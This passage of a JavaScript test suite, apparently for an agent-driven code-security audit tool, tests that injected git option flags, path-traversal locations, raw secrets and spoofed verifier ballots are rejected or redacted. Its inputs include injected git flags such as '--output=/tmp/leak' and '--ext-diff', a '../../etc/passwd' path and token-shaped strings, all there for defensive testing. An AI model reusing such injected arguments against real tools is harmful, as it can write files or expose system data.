      decision: 'REFUTES',
      reason: 'Path blocked',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'dead-path' }]
    },
    {
      findingId: 'SEC-REMED-R1',
      lens: 'IMPACT',
      decision: 'REFUTES',
      reason: 'Zero impact',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'impact-boundary' }]
    }
  ];
  const resValidThree = verifyRemediation(remCandidate, votesValidThree, process.cwd());
  if (!resValidThree.verified) {
    throw new Error(`R1-P0-02 VIOLATION: Valid 3-lens remediation was rejected: ${JSON.stringify(resValidThree)}`);
  }
  console.log('✔ 61. R1-P0-02 Invariant: verifyRemediation strictly mandates valid evidence bindings across all 3 lenses.');

  // 62. R1-P1-01 Invariant: Attack Path Schema physically verifies file existence, regular file, line bounds, and symlink containment
  // Case 1: Nonexistent source file -> REJECTED
  const apNonexistentSource = {
    attackPathId: 'AP-FAIL-1',
    source: { uri: 'nope-source.js', line: 999, description: 'HTTP user input' },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'executes command' },
    steps: [],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApNonexistent = validateAttackPath(apNonexistentSource, process.cwd());
  if (resApNonexistent.valid || !resApNonexistent.error.includes('file does not exist')) {
    throw new Error(`R1-P1-01 VIOLATION: Attack path with nonexistent file was accepted: ${JSON.stringify(resApNonexistent)}`);
  }

  // Case 2: Line beyond EOF in sink -> REJECTED
  const apBeyondEof = {
    attackPathId: 'AP-FAIL-2',
    source: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 10, description: 'Input' },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 999999, description: 'Sink' },
    steps: [],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApBeyondEof = validateAttackPath(apBeyondEof, process.cwd());
  if (resApBeyondEof.valid || !resApBeyondEof.error.includes('exceeds file line count')) {
    throw new Error(`R1-P1-01 VIOLATION: Attack path with line beyond EOF was accepted: ${JSON.stringify(resApBeyondEof)}`);
  }

  // Case 3: Target is directory, not regular file -> REJECTED
  const apTargetDir = {
    attackPathId: 'AP-FAIL-3',
    source: { uri: 'skills/3lens/scripts', line: 1, description: 'Directory as file' },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Sink' },
    steps: [],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApTargetDir = validateAttackPath(apTargetDir, process.cwd());
  if (resApTargetDir.valid || !resApTargetDir.error.includes('not a regular file')) {
    throw new Error(`R1-P1-01 VIOLATION: Directory target in attack path was accepted: ${JSON.stringify(resApTargetDir)}`);
  }

  // Case 4: Baseline preimage locationType -> valid with preimageContent line bounds
  const apBaselinePreimage = {
    attackPathId: 'AP-PASS-PREIMAGE',
    source: {
      uri: 'deleted-file.js',
      line: 5,
      description: 'Historical deleted source',
      locationType: 'baseline-preimage',
      preimageContent: 'line1\nline2\nline3\nline4\nline5\nline6\n'
    },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Sink' },
    steps: [],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApPreimage = validateAttackPath(apBaselinePreimage, process.cwd());
  if (!resApPreimage.valid) {
    throw new Error(`R1-P1-01 VIOLATION: Valid baseline preimage attack path was rejected: ${JSON.stringify(resApPreimage)}`);
  }

  // Case 4b: Baseline preimage with missing preimageContent -> REJECTED
  const apPreimageNoContent = {
    attackPathId: 'AP-FAIL-NO-PREIMAGE',
    source: {
      uri: 'deleted-file.js',
      line: 5,
      description: 'Historical deleted source',
      locationType: 'baseline-preimage'
    },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Sink' },
    steps: [],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApPreimageNoContent = validateAttackPath(apPreimageNoContent, process.cwd());
  if (resApPreimageNoContent.valid || !resApPreimageNoContent.error.includes('requires non-empty \'preimageContent\'')) {
    throw new Error(`R1-P1-01 VIOLATION: Preimage without content was accepted: ${JSON.stringify(resApPreimageNoContent)}`);
  }

  // Case 4c: Baseline preimage with line exceeding line count -> REJECTED
  const apPreimageBeyondEof = {
    attackPathId: 'AP-FAIL-PREIMAGE-EOF',
    source: {
      uri: 'deleted-file.js',
      line: 999,
      description: 'Historical deleted source',
      locationType: 'baseline-preimage',
      preimageContent: 'line1\nline2\n'
    },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Sink' },
    steps: [],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApPreimageBeyondEof = validateAttackPath(apPreimageBeyondEof, process.cwd());
  if (resApPreimageBeyondEof.valid || !resApPreimageBeyondEof.error.includes('exceeds baseline preimage line count')) {
    throw new Error(`R1-P1-01 VIOLATION: Preimage with out-of-bounds line was accepted: ${JSON.stringify(resApPreimageBeyondEof)}`);
  }

  // Case 4d: Nonexistent generated-validation-artifact -> REJECTED
  const apArtifactNonexistent = {
    attackPathId: 'AP-FAIL-ARTIFACT',
    source: {
      uri: 'nonexistent/artifact.json',
      line: 1,
      locationType: 'generated-validation-artifact'
    },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Sink' },
    steps: [],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApArtifactNonexistent = validateAttackPath(apArtifactNonexistent, process.cwd());
  if (resApArtifactNonexistent.valid || !resApArtifactNonexistent.error.includes('file does not exist')) {
    throw new Error(`R1-P1-01 VIOLATION: Nonexistent artifact was accepted: ${JSON.stringify(resApArtifactNonexistent)}`);
  }

  // Case 4e: Float line number -> REJECTED
  const apFloatLine = {
    attackPathId: 'AP-FAIL-FLOAT',
    source: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 1.5, description: 'Float line' },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Sink' },
    steps: [],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApFloatLine = validateAttackPath(apFloatLine, process.cwd());
  if (resApFloatLine.valid || !resApFloatLine.error.includes('invalid line number')) {
    throw new Error(`R1-P1-01 VIOLATION: Float line number was accepted: ${JSON.stringify(resApFloatLine)}`);
  }

  // Case 4f: Nonexistent step file -> REJECTED
  const apNonexistentStep = {
    attackPathId: 'AP-FAIL-STEP',
    source: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 10, description: 'Input' },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Sink' },
    steps: [{ uri: 'nonexistent/step.js', line: 1, description: 'Hop' }],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApNonexistentStep = validateAttackPath(apNonexistentStep, process.cwd());
  if (resApNonexistentStep.valid || !resApNonexistentStep.error.includes('file does not exist')) {
    throw new Error(`R1-P1-01 VIOLATION: Nonexistent step file was accepted: ${JSON.stringify(resApNonexistentStep)}`);
  }

  // Case 5: Valid current-tree attack path -> VALID
  const apValid = {
    attackPathId: 'AP-PASS-VALID',
    source: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 10, description: 'Controllable input' },
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Process execution' },
    steps: [{ uri: 'skills/3lens/scripts/safe-git.mjs', line: 20, description: 'Step' }],
    unmitigatedInvariant: 'No sanitizer exists'
  };
  const resApValid = validateAttackPath(apValid, process.cwd());
  if (!resApValid.valid) {
    throw new Error(`R1-P1-01 VIOLATION: Valid current-tree attack path was rejected: ${JSON.stringify(resApValid)}`);
  }
  console.log('✔ 62. R1-P1-01 Invariant: Attack Path Schema physically verifies file existence, regular file, line bounds, and symlink containment.');

  // 63. R1-P1-02 Invariant: Git --base / --head subcommand option injection is strictly rejected
  const injectedOutput = path.join(os.tmpdir(), 'agy_git_option_injection.out');
  if (fs.existsSync(injectedOutput)) {
    fs.unlinkSync(injectedOutput);
  }

  // 63.1 --output option injection rejected in base
  let optInjectionCaught = false;
  try {
    extractChangedFiles(gitFixture.repoPath, { base: `--output=${injectedOutput}`, head: 'HEAD' });
  } catch (e) {
    if (e.message.includes('Refusal to parse ref starting with \'-\'') || e.message.includes('GIT_REF_ERROR')) {
      optInjectionCaught = true;
    }
  }
  if (!optInjectionCaught) {
    throw new Error('R1-P1-02 VIOLATION: --output option injection in base was not rejected fail-closed');
  }

  // 63.1b --output option injection rejected in head
  let headOptInjectionCaught = false;
  try {
    extractChangedFiles(gitFixture.repoPath, { base: 'HEAD', head: `--output=${injectedOutput}` });
  } catch (e) {
    if (e.message.includes('Refusal to parse ref starting with \'-\'') || e.message.includes('GIT_REF_ERROR')) {
      headOptInjectionCaught = true;
    }
  }
  if (!headOptInjectionCaught) {
    throw new Error('R1-P1-02 VIOLATION: --output option injection in head was not rejected fail-closed');
  }

  if (fs.existsSync(injectedOutput)) {
    fs.unlinkSync(injectedOutput);
    throw new Error('R1-P1-02 CRITICAL VIOLATION: Git option injection successfully wrote to filesystem outside repo!');
  }

  // 63.2 --no-index and single-dash flags rejected
  for (const badToken of ['--no-index', '-o', '-d', '-f']) {
    try {
      resolveGitCommitRef(gitFixture.repoPath, badToken);
      throw new Error(`R1-P1-02 VIOLATION: ${badToken} was accepted`);
    } catch (e) {
      if (!e.message.includes('Refusal to parse ref starting with \'-\'')) throw e;
    }
  }

  // 63.3 --ext-diff option injection rejected
  try {
    resolveGitCommitRef(gitFixture.repoPath, '--ext-diff');
    throw new Error('R1-P1-02 VIOLATION: --ext-diff was accepted');
  } catch (e) {
    if (!e.message.includes('Refusal to parse ref starting with \'-\'')) throw e;
  }

  // 63.4 Invalid ref rejected
  try {
    resolveGitCommitRef(gitFixture.repoPath, 'completely-invalid-nonexistent-ref');
    throw new Error('R1-P1-02 VIOLATION: Nonexistent ref was accepted');
  } catch (e) {
    if (!e.message.includes('Cannot resolve reference to a valid commit')) throw e;
  }

  // 63.5 Valid branch / revision (HEAD) -> resolved SHA -> accepted
  const headResolvedSha = resolveGitCommitRef(gitFixture.repoPath, 'HEAD');
  if (!/^[0-9a-f]{40,64}$/i.test(headResolvedSha)) {
    throw new Error(`R1-P1-02 VIOLATION: Valid HEAD did not resolve to SHA hash: ${headResolvedSha}`);
  }

  // 63.6 Valid SHA -> accepted
  const shaResolved = resolveGitCommitRef(gitFixture.repoPath, headResolvedSha);
  if (shaResolved !== headResolvedSha) {
    throw new Error(`R1-P1-02 VIOLATION: Valid SHA resolution mismatch: ${shaResolved} vs ${headResolvedSha}`);
  }

  // 63.7 extractChangedFiles runs cleanly with resolved SHA and valid revisions
  const safeDiffResult = extractChangedFiles(gitFixture.repoPath, { base: 'HEAD~1', head: 'HEAD' });
  if (!safeDiffResult || typeof safeDiffResult.totalAccounted !== 'number') {
    throw new Error('R1-P1-02 VIOLATION: extractChangedFiles failed with valid resolved revisions');
  }

  // 63.8 readGitFileAtRevision safely rejects option injection and non-string filePath
  const readOptInj = readGitFileAtRevision(gitFixture.repoPath, '--output=/tmp/leak', 'test.txt');
  if (readOptInj !== null) {
    throw new Error('R1-P1-02 VIOLATION: readGitFileAtRevision did not return null on option injection');
  }
  const readNonString = readGitFileAtRevision(gitFixture.repoPath, 'HEAD', 12345);
  if (readNonString !== null) {
    throw new Error('R1-P1-02 VIOLATION: readGitFileAtRevision did not return null on non-string filePath');
  }

  // 63.9 detectStalePatch rejects option injection
  const staleInj = detectStalePatch(gitFixture.repoPath, ['test.txt'], '--output=/tmp/leak');
  if (!staleInj.stale || !staleInj.error.includes('Invalid or unsafe baseRevision')) {
    throw new Error('R1-P1-02 VIOLATION: detectStalePatch did not reject option injection fail-closed');
  }

  console.log('✔ 63. R1-P1-02 Invariant: Git --base / --head subcommand option injection is strictly rejected fail-closed.');

  // 64. R1-P1-03 Invariant: --canonical renderer validates canonical schema and redacts secrets
  // Case 1: Raw secrets in canonical findings are completely redacted across title and description
  const rawSecretAws = ['AKIA', 'IOSFODNN7EXAMPLE'].join('');
  const rawSecretGhp = ['ghp_', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'].join('');
  const rawSecretCanonical = [
    {
      id: 'SEC-CANON-1',
      ruleId: 'CWE-798',
      title: `Hardcoded Key ${rawSecretAws}`,
      description: `Discovered GitHub token ${rawSecretGhp} in config`,
      location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1, lineSnippet: `const k = "${rawSecretGhp}";` },
      disposition: 'DEFERRED',
      verdict: 'NEEDS_MANUAL_REVIEW'
    }
  ];
  const renderedMd = renderMarkdownFromCanonical({ canonicalFindings: rawSecretCanonical, repoRoot: process.cwd() });
  if (renderedMd.includes(rawSecretAws)) {
    throw new Error('R1-P1-03 VIOLATION: Raw AWS secret leaked into rendered Markdown from canonical findings');
  }
  if (renderedMd.includes(rawSecretGhp)) {
    throw new Error('R1-P1-03 VIOLATION: Raw GitHub token leaked into rendered Markdown from canonical findings');
  }
  if (!renderedMd.includes('REDACTED_AWS_ACCESS_KEY')) {
    throw new Error('R1-P1-03 VIOLATION: Redacted AWS key fingerprint missing from rendered Markdown');
  }
  if (!renderedMd.includes('REDACTED_GITHUB_TOKEN')) {
    throw new Error('R1-P1-03 VIOLATION: Redacted GitHub token fingerprint missing from rendered Markdown');
  }

  // Case 2: Fabricated REPORTABLE claim without consensus is downgraded to DEFERRED under Default-Deny
  const fakeReportableCanonical = [
    {
      id: 'SEC-FAKE-REPORTABLE',
      ruleId: 'CWE-89',
      title: 'Fabricated Confirmed SQLi',
      description: 'Pretends to be confirmed without votes',
      location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 10 },
      disposition: 'REPORTABLE',
      verdict: 'CONFIRMED',
      consensus: { supports: 0, totalVotes: 0 },
      rigor: { score: 0.1 }
    }
  ];
  const validatedFindings = validateCanonicalFindings(fakeReportableCanonical, process.cwd());
  if (validatedFindings[0].disposition !== 'DEFERRED' || validatedFindings[0].verdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error(`R1-P1-03 VIOLATION: Fabricated REPORTABLE finding was not downgraded to DEFERRED: ${JSON.stringify(validatedFindings[0])}`);
  }
  const renderedFakeMd = renderMarkdownFromCanonical({ canonicalFindings: fakeReportableCanonical, repoRoot: process.cwd() });
  if (renderedFakeMd.includes('Confirmed Vulnerabilities (Reportable): 1')) {
    throw new Error('R1-P1-03 VIOLATION: Fabricated canonical finding was rendered as Confirmed in Markdown report');
  }

  // Case 3: Traversal location in canonical finding downgraded to DEFERRED fail-closed
  const traversalCanonical = [
    {
      id: 'SEC-TRAVERSAL',
      ruleId: 'CWE-89',
      title: 'Traversal Path SQLi',
      location: { uri: '../../etc/passwd', startLine: 1 },
      disposition: 'REPORTABLE',
      verdict: 'CONFIRMED',
      consensus: { supports: 3, totalVotes: 3 },
      rigor: { score: 0.9 }
    }
  ];
  const validatedTraversal = validateCanonicalFindings(traversalCanonical, process.cwd());
  if (validatedTraversal[0].disposition !== 'DEFERRED') {
    throw new Error('R1-P1-03 VIOLATION: Canonical finding with path traversal location was not downgraded to DEFERRED');
  }

  // Case 4: Split vote in canonical finding downgraded to DEFERRED fail-closed
  const splitVoteCanonical = [
    {
      id: 'SEC-SPLIT',
      ruleId: 'CWE-89',
      title: 'Split Vote SQLi',
      location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 10 },
      disposition: 'REPORTABLE',
      verdict: 'CONFIRMED',
      consensus: { supports: 2, refutes: 5, totalVotes: 7 },
      rigor: { score: 0.9 }
    }
  ];
  const validatedSplit = validateCanonicalFindings(splitVoteCanonical, process.cwd());
  if (validatedSplit[0].disposition !== 'DEFERRED') {
    throw new Error('R1-P1-03 VIOLATION: Canonical finding with split votes / active refutations was not downgraded to DEFERRED');
  }

  console.log('✔ 64. R1-P1-03 Invariant: Canonical renderer validates canonical schema and redacts secrets under Default-Deny.');

  // 65. R1-P1-04 Invariant: CVSS v4 Vector and Score Consistency Validation
  // 65.1 Zero-impact vector with non-zero score rejected fail-closed
  const zeroImpactInconsistent = {
    vector: 'CVSS:4.0/AV:P/AC:H/AT:P/PR:H/UI:A/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N',
    score: 10.0,
    severity: 'CRITICAL'
  };
  const zeroImpRes = validateCvssV4(zeroImpactInconsistent);
  if (zeroImpRes.valid || !zeroImpRes.error.includes('zero-impact vector')) {
    throw new Error('R1-P1-04 VIOLATION: Zero-impact vector with score 10 was not rejected fail-closed');
  }

  // 65.2 Physical vector with CRITICAL score rejected fail-closed
  const physicalInconsistent = {
    vector: 'CVSS:4.0/AV:P/AC:H/AT:P/PR:H/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N',
    score: 9.5,
    severity: 'CRITICAL'
  };
  const physRes = validateCvssV4(physicalInconsistent);
  if (physRes.valid || !physRes.error.includes('Physical attack vector (AV:P) cannot be CRITICAL')) {
    throw new Error('R1-P1-04 VIOLATION: Physical vector with score 9.5 was not rejected fail-closed');
  }

  // 65.3 Score / severity contradiction rejected fail-closed
  const scoreSeverityContradiction = {
    vector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N',
    score: 2.5,
    severity: 'CRITICAL'
  };
  const contraRes = validateCvssV4(scoreSeverityContradiction);
  if (contraRes.valid || !contraRes.error.includes('maps to LOW, but claimed severity is \'CRITICAL\'')) {
    throw new Error('R1-P1-04 VIOLATION: Score 2.5 with severity CRITICAL was not rejected fail-closed');
  }

  // 65.4 Zero-impact vector with score 0.0 or null accepted as NONE
  const zeroImpValid = {
    vector: 'CVSS:4.0/AV:P/AC:H/AT:P/PR:H/UI:A/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N'
  };
  const zeroImpValidRes = validateCvssV4(zeroImpValid);
  if (!zeroImpValidRes.valid || zeroImpValidRes.severity !== 'NONE') {
    throw new Error('R1-P1-04 VIOLATION: Zero-impact vector without score was not accepted as severity NONE');
  }

  // 65.5 Consistent valid vector and score accepted
  const consistentValid = {
    vector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N',
    score: 9.3,
    severity: 'CRITICAL'
  };
  const validRes = validateCvssV4(consistentValid);
  if (!validRes.valid || validRes.score !== 9.3 || validRes.severity !== 'CRITICAL') {
    throw new Error('R1-P1-04 VIOLATION: Consistent CVSS vector and score failed validation');
  }

  // 65.6 Physical vector with score omitted but severity CRITICAL rejected fail-closed
  const physNoScoreCrit = {
    vector: 'CVSS:4.0/AV:P/AC:H/AT:P/PR:H/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N',
    severity: 'CRITICAL'
  };
  const physNoScoreRes = validateCvssV4(physNoScoreCrit);
  if (physNoScoreRes.valid) {
    throw new Error('R1-P1-04 VIOLATION: Physical vector with omitted score and claimed CRITICAL was accepted');
  }

  // 65.7 Zero vulnerable system impact with score omitted but severity CRITICAL rejected fail-closed
  const zeroVulnNoScoreCrit = {
    vector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H',
    severity: 'CRITICAL'
  };
  const zeroVulnRes = validateCvssV4(zeroVulnNoScoreCrit);
  if (zeroVulnRes.valid) {
    throw new Error('R1-P1-04 VIOLATION: Zero vulnerable-system impact with claimed CRITICAL was accepted');
  }

  // 65.8 Low-only vulnerable impact (VC:L/VI:L/VA:L) with claimed CRITICAL rejected fail-closed
  const lowOnlyCrit = {
    vector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N',
    score: 9.2,
    severity: 'CRITICAL'
  };
  const lowOnlyRes = validateCvssV4(lowOnlyCrit);
  if (lowOnlyRes.valid) {
    throw new Error('R1-P1-04 VIOLATION: Low-only vulnerable impact with claimed CRITICAL score was accepted');
  }

  // 65.9 validateCanonicalFindings filters out contradictory CVSS payload fail-closed
  const canonWithBadCvss = [
    {
      id: 'SEC-CANON-BAD-CVSS',
      ruleId: 'CWE-89',
      title: 'Canonical Finding with Inconsistent CVSS',
      location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
      cvssV4: {
        vector: 'CVSS:4.0/AV:P/AC:H/AT:P/PR:H/UI:A/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N',
        score: 10.0,
        severity: 'CRITICAL'
      }
    }
  ];
  const validatedCanonCvss = validateCanonicalFindings(canonWithBadCvss, process.cwd());
  if (validatedCanonCvss[0].cvssV4 !== null) {
    throw new Error('R1-P1-04 VIOLATION: Inconsistent CVSS payload was not stripped from canonical findings');
  }

  console.log('✔ 65. R1-P1-04 Invariant: CVSS v4 Vector, Score, and Severity Consistency Validation enforced fail-closed.');

  // 66. R1-P1-05 Invariant: Verifier Ballot Task-Correlation Nonce Enforcement
  // 66.1 validateBallot rejects missing nonce when expectedNonce is required
  const ballotMissingNonce = {
    findingId: 'SEC-NONCE-1',
    lens: 'REACHABILITY',
    decision: 'SUPPORTS',
    evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'entrypoint' }]
  };
  const resNoNonce = validateBallot(ballotMissingNonce, { id: 'SEC-NONCE-1', nonce: 'X-NONCE-CORRECT' });
  if (resNoNonce.valid || !resNoNonce.reason.includes('Missing required task-correlation nonce')) {
    throw new Error('R1-P1-05 VIOLATION: validateBallot accepted ballot missing required nonce');
  }

  // 66.2 validateBallot rejects mismatched nonce
  const ballotWrongNonce = {
    ...ballotMissingNonce,
    nonce: 'X-NONCE-SPOOFED'
  };
  const resWrongNonce = validateBallot(ballotWrongNonce, { id: 'SEC-NONCE-1', nonce: 'X-NONCE-CORRECT' });
  if (resWrongNonce.valid || !resWrongNonce.reason.includes('Task-correlation nonce mismatch')) {
    throw new Error('R1-P1-05 VIOLATION: validateBallot accepted ballot with mismatched nonce');
  }

  // 66.3 validateBallot accepts matching nonce
  const ballotValidNonce = {
    ...ballotMissingNonce,
    nonce: 'X-NONCE-CORRECT'
  };
  const resValidNonce = validateBallot(ballotValidNonce, { id: 'SEC-NONCE-1', nonce: 'X-NONCE-CORRECT' });
  if (!resValidNonce.valid) {
    throw new Error(`R1-P1-05 VIOLATION: validateBallot rejected valid ballot: ${resValidNonce.reason}`);
  }

  // 66.4 deriveFinalDisposition ignores ballots with mismatched nonces, falling back to DEFERRED
  const candidateWithNonce = {
    id: 'SEC-NONCE-1',
    ruleId: 'CWE-89',
    title: 'Nonce Protected Finding',
    nonce: 'X-NONCE-CORRECT',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 10 }
  };
  const spoofedVotes = [
    {
      findingId: 'SEC-NONCE-1',
      lens: 'REACHABILITY',
      decision: 'SUPPORTS',
      nonce: 'X-NONCE-ATTACKER',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'entrypoint' }]
    },
    {
      findingId: 'SEC-NONCE-1',
      lens: 'DEFENSES',
      decision: 'SUPPORTS',
      nonce: 'X-NONCE-ATTACKER',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'guard' }]
    },
    {
      findingId: 'SEC-NONCE-1',
      lens: 'IMPACT',
      decision: 'SUPPORTS',
      nonce: 'X-NONCE-ATTACKER',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'sink' }]
    }
  ];
  const dispNonce = deriveFinalDisposition(candidateWithNonce, spoofedVotes, { score: 1.0 }, process.cwd());
  if (dispNonce.disposition !== 'DEFERRED') {
    throw new Error('R1-P1-05 VIOLATION: deriveFinalDisposition honored spoofed ballots with wrong nonce');
  }

  // 66.5 loadVotes filters out mismatched nonces when options.expectedNonces provided
  const tempNonceDir = fs.mkdtempSync(path.join(os.tmpdir(), 'nonce-test-'));
  try {
    fs.writeFileSync(path.join(tempNonceDir, 'v1.json'), JSON.stringify([ballotWrongNonce, ballotValidNonce]));
    const filteredVotes = loadVotes(tempNonceDir, { expectedNonces: { 'SEC-NONCE-1': 'X-NONCE-CORRECT' } });
    if (filteredVotes.length !== 1 || filteredVotes[0].nonce !== 'X-NONCE-CORRECT') {
      throw new Error('R1-P1-05 VIOLATION: loadVotes did not filter out mismatched nonce ballots');
    }
  } finally {
    fs.rmSync(tempNonceDir, { recursive: true, force: true });
  }

  // 66.6 finalizeScan rejects spoofed impactVote with mismatched nonce
  const nonceCandidate = {
    id: 'SEC-NONCE-IMP',
    ruleId: 'CWE-89',
    title: 'Nonce Integrity Candidate',
    severity: 'MEDIUM',
    nonce: 'X-NONCE-VALID-IMP',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 }
  };
  const spoofedImpactVote = {
    findingId: 'SEC-NONCE-IMP',
    lens: 'IMPACT',
    decision: 'SUPPORTS',
    nonce: 'X-NONCE-SPOOFED',
    calibratedSeverity: 'CRITICAL',
    cvssV4Vector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N',
    evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 1, role: 'sink' }]
  };
  const finalScanRes = finalizeScan({ candidates: [nonceCandidate], votes: [spoofedImpactVote], repoRoot: process.cwd() });
  if (finalScanRes.canonicalFindings[0].severity === 'CRITICAL' || finalScanRes.canonicalFindings[0].cvssV4 !== null) {
    throw new Error('R1-P1-05 VIOLATION: finalizeScan allowed spoofed impactVote with wrong nonce to override severity or CVSS');
  }

  // 66.7 loadVotes with options.expectedNonces rejects unmapped findings fail-closed
  const tempNonceDir2 = fs.mkdtempSync(path.join(os.tmpdir(), 'nonce-test2-'));
  try {
    const unmappedBallot = { findingId: 'SEC-UNMAPPED', lens: 'IMPACT', decision: 'SUPPORTS', nonce: 'X-ANY' };
    fs.writeFileSync(path.join(tempNonceDir2, 'v2.json'), JSON.stringify([unmappedBallot]));
    const filteredVotes2 = loadVotes(tempNonceDir2, { expectedNonces: { 'SEC-NONCE-1': 'X-NONCE-CORRECT' } });
    if (filteredVotes2.length !== 0) {
      throw new Error('R1-P1-05 VIOLATION: loadVotes allowed unmapped finding ballot to pass open');
    }
  } finally {
    fs.rmSync(tempNonceDir2, { recursive: true, force: true });
  }

  console.log('✔ 66. R1-P1-05 Invariant: Verifier ballot task-correlation nonce enforced fail-closed.');

  // 67. R2-P0-01 / 02 / 03 Invariant: Zero-candidate discovery cell, Default-Deny claim model, and auditIntent convergence.
  // 67.1 validateDiscoveryCell accepts REVIEWED_NO_CANDIDATE with concrete repository evidence
  const validCell = {
    component: 'Auth',
    family: 'auth/authz/tenancy',
    status: 'REVIEWED_NO_CANDIDATE',
    reviewedEvidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 1 }],
    notes: 'Auth guards inspected, zero unmitigated vulnerabilities found.'
  };
  const cellRes1 = validateDiscoveryCell(validCell, process.cwd());
  if (!cellRes1.valid) {
    throw new Error(`R2-P0-01 VIOLATION: valid cell rejected: ${cellRes1.error}`);
  }

  // 67.2 validateDiscoveryCell rejects REVIEWED_NO_CANDIDATE with missing evidence (anti-lazy review)
  const emptyEvidenceCell = {
    component: 'Auth',
    family: 'auth/authz/tenancy',
    status: 'REVIEWED_NO_CANDIDATE',
    reviewedEvidence: [],
    notes: 'Trust me no findings'
  };
  const cellRes2 = validateDiscoveryCell(emptyEvidenceCell, process.cwd());
  if (cellRes2.valid) {
    throw new Error('R2-P0-01 VIOLATION: REVIEWED_NO_CANDIDATE accepted with empty evidence');
  }

  // 67.3 validateDiscoveryCell rejects non-existent evidence path
  const nonExistentCell = {
    component: 'Auth',
    family: 'auth/authz/tenancy',
    status: 'REVIEWED_NO_CANDIDATE',
    reviewedEvidence: [{ path: 'nonexistent/file.ts', line: 1 }]
  };
  const cellRes3 = validateDiscoveryCell(nonExistentCell, process.cwd());
  if (cellRes3.valid) {
    throw new Error('R2-P0-01 VIOLATION: REVIEWED_NO_CANDIDATE accepted with non-existent file');
  }

  // 67.4 validateDiscoveryCell rejects invalid status
  const invalidStatusCell = {
    component: 'Auth',
    family: 'auth/authz/tenancy',
    status: 'COMPLETELY_SAFE',
    reviewedEvidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 1 }]
  };
  const cellRes4 = validateDiscoveryCell(invalidStatusCell, process.cwd());
  if (cellRes4.valid) {
    throw new Error('R2-P0-01 VIOLATION: Invalid cell status accepted');
  }

  // 67.5 Zero-candidate run under COMPLETE coverage achieves Bounded Clean Assurance
  const cleanManifest = buildDirectoryManifest(process.cwd());
  const zeroCandidateRun = finalizeScan({
    candidates: [],
    manifest: cleanManifest,
    repoRoot: process.cwd(),
    auditIntent: 'REGRESSION',
    discoveryMatrix: [validCell],
    allowSelfAudit: true
  });
  if (!zeroCandidateRun.summary.canDeclareClean || !zeroCandidateRun.summary.cleanAssuranceBounded) {
    throw new Error('R2-P0-01 VIOLATION: Clean run with 0 candidates could not declare bounded clean assurance');
  }
  if (zeroCandidateRun.summary.auditIntent !== 'REGRESSION') {
    throw new Error(`R2-P0-03 VIOLATION: auditIntent REGRESSION not preserved in summary: ${zeroCandidateRun.summary.auditIntent}`);
  }
  if (zeroCandidateRun.summary.discoveryCellsSummary.reviewedNoCandidate !== 1) {
    throw new Error('R2-P0-01 VIOLATION: discoveryCellsSummary did not count reviewedNoCandidate');
  }

  // 67.6 Markdown and SARIF express bounded assurance and auditIntent
  const zeroSarif = renderSarifFromCanonical({
    canonicalFindings: zeroCandidateRun.canonicalFindings,
    manifest: cleanManifest,
    coverageStatus: zeroCandidateRun.coverageStatus,
    repoRoot: process.cwd(),
    auditIntent: zeroCandidateRun.auditIntent
  });
